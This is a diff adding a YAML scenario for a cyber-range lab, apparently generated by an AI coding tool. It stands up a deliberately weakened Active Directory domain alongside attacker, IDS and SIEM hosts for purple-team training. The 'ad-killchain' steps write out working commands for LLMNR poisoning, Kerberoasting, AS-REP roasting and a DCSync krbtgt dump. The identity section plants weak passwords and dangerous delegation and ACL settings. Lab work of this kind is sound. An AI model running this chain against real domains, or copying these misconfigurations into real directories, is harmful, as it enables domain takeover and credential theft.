@@ -1,0 +1,241 @@
+scenario_schema_version: 1
+
+scenario:
+  id: ad-domain-lab
+  version: 2
+  description: |
+    Corpus-derived Active Directory attack-and-defend lab (Stage-2 of the
+    scenario-ai-research).
+
+    Synthesized by Claude Code from the 324-video cyber-range knowledge corpus
+    (scenario_ai_research/stage2/CORPUS_DIGEST.md). AD attack/defend is one of the richest
+    corpus themes: "Top 10 Active Directory Attack Methods", the "Vulnerable-AD"
+    setup script, Rubeus/Kerberoasting, BloodHound/SharpHound enumeration,
+    Responder LLMNR poisoning, Pass-the-Hash with Mimikatz, DCSync — and the
+    canonical home-lab build (Windows Server DC + Win10/11 victim + Kali +
+    Splunk/Wazuh). This is the identity archetype: a domain controller, a
+    domain-joined finance workstation (high-value victim), an attacker staged
+    with the full AD kill-chain toolkit, and a SOC sensor + SIEM hunting
+    Kerberos/LDAP/SMB/NTLM traffic.
+
+    Topology is a single domain segment (AD labs are typically flat L2) plus a
+    router for egress NAT (the tooling needs package/pip pulls).
+
+    SCOPE — deployable: Infrastructure + Apps & Tools (attacker kit, SOC sensor,
+    SIEM) + the router, AND the AD IDENTITY core — dc01 promotes to the corp.lab
+    forest (`role: adds`, W2a) and the domain users/groups below are created
+    (OP-OVL identity, W2b), both live-verified on dev45; ws01 domain-joins it
+    (`joins:`, join-host-to-domain, W2 §6.3 — implemented + plan-verified).
+    docs/SLICE_WINDOWS_AD.md §6. Passes `axrange validate` and `axrange plan`.
+    STILL DEFERRED (CORPUS_DIGEST.md §5):
+      - OUs/SPNs and the "Vulnerable-AD" weakening (`config` install kind);
+      - the red-team AD ATTACK CHAIN (LLMNR poison -> Responder capture -> crack;
+        Kerberoast -> Rubeus -> Hashcat; BloodHound path -> DCSync -> domain
+        admin) via OP-ACT;
+      - the AD DEFENSE OVERLAY (Sigma rules for Kerberoasting/DCSync, Sysmon/
+        Wazuh telemetry, LDAP monitoring) via OP-OVL.
+
+layers:
+  infra:
+    networks:
+      # gateway = the gw router's LAN IP (router slice Phase 2: egress NAT).
+      - { id: corp, cidr: 10.60.10.0/24, vlan: 80, gateway: 10.60.10.1 }
+    nodes:
+      # Egress/NAT gateway (router slice Phase 2): a 1-LAN router whose WAN uplink
+      # gives the domain segment internet/apt/pip egress. Debian/nftables.
+      - id: gw
+        kind: router
+        nets: [ { net: corp, ip: 10.60.10.1 } ]
+        image: debian-12-cloud@v1
+        requires: [linux]
+        resources: { cpu: 1, ram: 1Gi, disk: 10Gi }
+      # Domain controller — promotes to the corp.lab forest (role: adds, W2a).
+      # windows-server-2022 (a Server SKU; win11 clients cannot be promoted to a
+      # DC). DNS rides on the DC itself (-InstallDns). Tapped so the SOC sees the
+      # Kerberos/LDAP/SMB the AD layer generates.
+      - id: dc01
+        kind: host
+        nets: [ { net: corp, ip: 10.60.10.10 } ]
+        image: windows-server-2022@v1
+        requires: [windows, kernel:powershell-5plus, kernel:dotnet-clr]
+        resources: { cpu: 2, ram: 4Gi, disk: 60Gi }
+      # Domain-joined finance workstation — high-value victim / lateral target.
+      # joins: corp.lab -> join-host-to-domain (W2 §6.3) after the DC is up.
+      - id: ws01
+        kind: host
+        nets: [ { net: corp, ip: 10.60.10.20 } ]
+        image: win11-finance@v4
+        requires: [windows, kernel:edr-hooks, kernel:powershell-5plus]
+        resources: { cpu: 2, ram: 4Gi, disk: 60Gi }
+        joins: corp.lab
+      # Attacker on the LAN — staged with the corpus's full AD attack kit.
+      - id: attacker
+        kind: host
+        nets: [ { net: corp, ip: 10.60.10.66 } ]
+        image: debian-12-cloud@v1
+        requires: [linux]
+        resources: { cpu: 2, ram: 2Gi, disk: 20Gi }
+      # SOC SENSOR — Suricata + Zeek, hunting AD protocol traffic (Kerberos/LDAP/SMB).
+      - id: detect
+        kind: host
+        nets: [ { net: corp, ip: 10.60.10.50 } ]
+        image: debian-12-cloud@v1
+        requires: [linux, kernel:ebpf, kernel:audit]
+        resources: { cpu: 2, ram: 4Gi, disk: 40Gi }
+      # SOC SIEM — Wazuh single-node (the home-lab Splunk/Wazuh tier), containerized.
+      - id: siem
+        kind: host
+        nets: [ { net: corp, ip: 10.60.10.51 } ]
+        image: ubuntu-server-22@v5
+        requires: [linux, kernel:container-runtime]
+        resources: { cpu: 4, ram: 8Gi, disk: 60Gi }
+  apps:
+    # DC promotion (W2a): `role: adds` stands up the corp.lab forest on dc01; the
+    # overlays.identity users below are then created on it (W2b create-domain-user).
+    - id: ad-dc
+      install:
+        - { role: adds }
+      provides:
+        - { domain: corp.lab }
+    # Attacker AD kit: scanners + crackers + LDAP/SMB clients (pkg), then the
+    # pip/git-sourced AD tools (script): impacket, bloodhound.py, netexec, Responder.
+    - id: ad-offense
+      install:
+        - { pkg: nmap }
+        - { pkg: python3-pip }
+        - { pkg: git }
+        - { pkg: hashcat }
+        - { pkg: john }
+        - { pkg: ldap-utils }
+        - { pkg: smbclient }
+        - { pkg: netcat-traditional }
+        # Debian-packaged impacket — the kill chain's AS-REP/Kerberoast/DCSync
+        # scripts (impacket-getnpusers / -getuserspns / -secretsdump). apt-sourced
+        # so the chain works without pip egress once the router is up.
+        - { pkg: python3-impacket }
+        - { script: ./scripts/ad_offense.sh }
+    # SOC sensor: Suricata + Zeek + capture utils, then AD-focused detection notes.
+    - id: sensor-stack
+      install:
+        - { pkg: suricata }
+        - { pkg: zeek }
+        - { pkg: tcpdump }
+        - { pkg: jq }
+        - { script: ./scripts/sensor_setup.sh }
+    # SOC SIEM: container runtime, then bring up the Wazuh single-node stack.
+    - id: siem-stack
+      install:
+        - { pkg: docker.io }
+        - { pkg: docker-compose-v2 }
+        - { script: ./scripts/siem_setup.sh }
+
+  # ---------------------------------------------------------------------------
+  # OP-ACT — the corpus's Active Directory attack chain (red team), run from the
+  # LAN `attacker` against the corp.lab domain. Inline-steps MVP (one-shot,
+  # local actor — docs/SLICE_ACTIVITY.md): recon -> LLMNR poison -> SMB/LDAP enum
+  # -> AS-REP roast -> Kerberoast -> DCSync. Every step is best-effort (logs +
+  # continues), so a missing tool/cred never aborts the chain — and the AD-protocol
+  # TRAFFIC (Kerberos/LDAP/SMB/NTLM/DRSUAPI) is generated by the attempt itself,
+  # which is exactly what the SOC sensor + SIEM hunt. The kit is staged by
+  # ad-offense (scripts/ad_offense.sh + apt). DC=10.60.10.10, domain corp.lab.
+  # ---------------------------------------------------------------------------
+  activity:
+    - id: ad-killchain
+      actor: red-operator
+      inline:
+        steps:
+          # 1. RECON — the AD service surface on the DC: DNS 53, Kerberos 88,
+          #    RPC 135, NetBIOS 139, LDAP 389, SMB 445, kpasswd 464, LDAPS 636,
+          #    Global Catalog 3268, RDP 3389. A loud SYN sweep the SOC should flag.
+          - tool: nmap
+            args: -Pn -n -sS -p 53,88,135,139,389,445,464,636,3268,3389
+            target: 10.60.10.10
+          # 2. LLMNR / NBT-NS / mDNS poisoning — Responder answers broadcast name
+          #    lookups to capture NetNTLM hashes (the classic no-credential entry).
+          #    A 20s analyze/poison burst on the corp segment (UDP 5355/137/5353).
+          - run: IF=$(ip route get 10.60.10.10 2>/dev/null | grep -oP 'dev \K\S+' | head -1); timeout 20 python3 /opt/Responder/Responder.py -I "${IF:-eth0}" -A 2>&1 | tail -15 || echo "[axr] responder unavailable (egress-gated)"; true
+          # 3. SMB enumeration — null/guest session: shares + password policy +
+          #    users. netexec (CME successor) preferred; smbclient is the apt fallback.
+          - run: nxc smb 10.60.10.10 -u '' -p '' --shares --pass-pol --users 2>&1 | tail -40 || smbclient -N -L //10.60.10.10 2>&1 | tail -20; true
+          # 4. LDAP enumeration — anonymous bind reveals the naming context (and, on
+          #    a misconfigured DC, user/SPN objects). LDAP 389; ldap-utils (apt).
+          - run: ldapsearch -x -H ldap://10.60.10.10 -s base namingContexts 2>&1 | tail -15; ldapsearch -x -H ldap://10.60.10.10 -b 'DC=corp,DC=lab' '(servicePrincipalName=*)' sAMAccountName 2>&1 | tail -20; true
+          # 5. AS-REP roasting — accounts flagged "do not require Kerberos preauth"
+          #    return an offline-crackable AS-REP. impacket GetNPUsers over a user
+          #    list; one Kerberos AS-REQ per user (port 88). NOTE: Debian's
+          #    python3-impacket ships GetNPUsers.py under /usr/share/doc/.../examples
+          #    (NOT in PATH, unlike impacket-secretsdump) — invoke it by path.
+          - run: IMPEX=/usr/share/doc/python3-impacket/examples; printf 'helpdesk\nsvc-sql\njdoe\nadministrator\nkrbtgt\n' > /tmp/ad_users.txt; ( python3 "$IMPEX/GetNPUsers.py" corp.lab/ -no-pass -usersfile /tmp/ad_users.txt -dc-ip 10.60.10.10 || GetNPUsers.py corp.lab/ -no-pass -usersfile /tmp/ad_users.txt -dc-ip 10.60.10.10 ) 2>&1 | tail -25; true
+          # 6. KERBEROASTING — authenticate as svc-sql (AS-REQ -> TGT) then request a
+          #    TGS for every SPN-bearing service account (TGS-REQ); the TGS is offline-
+          #    crackable. impacket GetUserSPNs; Kerberos on 88. The lab-default domain
+          #    password is what create-domain-user sets (W2b): Axr4nge-Lab!.
+          - run: IMPEX=/usr/share/doc/python3-impacket/examples; ( python3 "$IMPEX/GetUserSPNs.py" corp.lab/helpdesk:'Axr4nge-Lab!' -dc-ip 10.60.10.10 -request || GetUserSPNs.py corp.lab/helpdesk:'Axr4nge-Lab!' -dc-ip 10.60.10.10 -request ) 2>&1 | tail -25; true
+          # 7. DCSYNC — replicate secrets from the DC over DRSUAPI (the domain-admin
+          #    objective). With the over-privileged helpdesk (Domain Admins) cred this
+          #    SUCCEEDS — dumps krbtgt for a golden ticket. impacket-secretsdump (this
+          #    one IS in PATH). RPC 135 + high ports.
+          - run: ( impacket-secretsdump corp.lab/helpdesk:'Axr4nge-Lab!'@10.60.10.10 -just-dc-user krbtgt || python3 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.lab/helpdesk:'Axr4nge-Lab!'@10.60.10.10 -just-dc-user krbtgt ) 2>&1 | tail -20; true
+
+# Domain identities created on dc01 once the forest is up (W2b create-domain-user,
+# after domain-ready). The corpus's canonical AD-attack identity set: an over-
+# privileged Domain Admins account (DCSync / golden-ticket target), a service
+# account (the Kerberoast target — SPN setting is a follow-on), and a regular
+# finance user. external attackers are the LAN `attacker` host, not domain users.
+overlays:
+  identity:
+    # Over-privileged Domain Admin (DCSync / golden-ticket target). OU: IT. Keeps
+    # the lab-default password — the attack chain authenticates + DCSyncs as it.
+    - { id: helpdesk, type: user, domain: corp.lab, groups: [Domain Admins], ou: IT }
+    # KERBEROASTABLE service account (Vulnerable-AD §9): an SPN + a weak password +
+    # forced RC4 -> its TGS is offline-crackable. The corpus's canonical Kerberoast
+    # target. OU: Service Accounts.
+    # KERBEROASTABLE service account, ALSO trusted for UNCONSTRAINED DELEGATION (it
+    # can impersonate any user that authenticates to it — the printer-bug / coerce
+    # path the corpus highlights). Double-weakened. OU: Service Accounts.
+    - { id: svc-sql, type: user, domain: corp.lab, groups: [Domain Users],
+        spn: "MSSQLSvc/sql01.corp.lab:1433", password: "Summer2024!",
+        ou: Service Accounts, delegation: unconstrained }
+    # AS-REP ROASTABLE user (no Kerberos pre-auth) — an offline-crackable AS-REP
+    # with no credential needed. OU: Finance.
+    - { id: jdoe, type: user, domain: corp.lab, groups: [Domain Users],
+        asrep_roastable: true, password: "Password123", ou: Finance }
+    # DANGEROUS-ACL takeover path (BloodHound edge, §9): a low-priv helpdesk intern
+    # is granted GenericAll over the helpdesk DA -> intern can reset helpdesk's
+    # password and pivot to Domain Admin. The canonical misconfigured-ACL attack path.
+    - { id: intern, type: user, domain: corp.lab, groups: [Domain Users],
+        password: "Welcome1", ou: IT,
+        acl: [ { right: GenericAll, target: helpdesk } ] }
+    # Local break-glass admin on the finance workstation — NOT a domain account.
+    # The canonical local-admin-password-reuse / Pass-the-Hash lateral target the
+    # corpus calls out. host: binds it to ws01 (W2 local-user branch -> New-LocalUser,
+    # docs/SLICE_WINDOWS_AD.md §6.3); no domain: => created locally on that host.
+    - { id: wsadmin,  type: user, host: ws01, groups: [Administrators] }
+  # OP-OVL defense (blue team) — HOST-side AD detection on the DC. Enables the
+  # Windows audit subcategories (4768/4769 Kerberos, 4662 DCSync, 4624/4625 logon)
+  # so the DC's Security event log records the AD attack chain — the host substrate
+  # the SIEM (siem-stack Wazuh) forwards/correlates, complementing the network IDS
+  # (the ad-ids suricata-sensor). Applied post-promotion (gated on domain-ready).
+  defense:
+    - id: dc-ad-audit
+      tool: sysmon
+      installed_on: [dc01]
+
+# OP-OVL defense (blue team) — the in-scenario AD network IDS. A suricata-sensor
+# captures the tapped corp segment (the DC + workstations) and scores it against the
+# AD attack-chain detection ruleset (Kerberoast/DCSync/LLMNR/recon). This is the blue
+# half the OP-ACT `ad-killchain` red half is measured against — the purple loop. The
+# sensor clones the pre-baked suricata-sensor image (suricata present, no egress).
+sensors:
+  - id: ad-ids
+    type: suricata-sensor
+    primary: true
+    rules: ./scripts/suricata_ad.rules
+
+bindings:
+  - { app: ad-dc,        host: dc01 }
+  - { app: ad-offense,   host: attacker }
+  - { app: sensor-stack, host: detect }
+  - { app: siem-stack,   host: siem }
+  # The AD kill chain runs from the attacker (the host carrying the offense kit).
+  - { activity: ad-killchain, host: attacker }
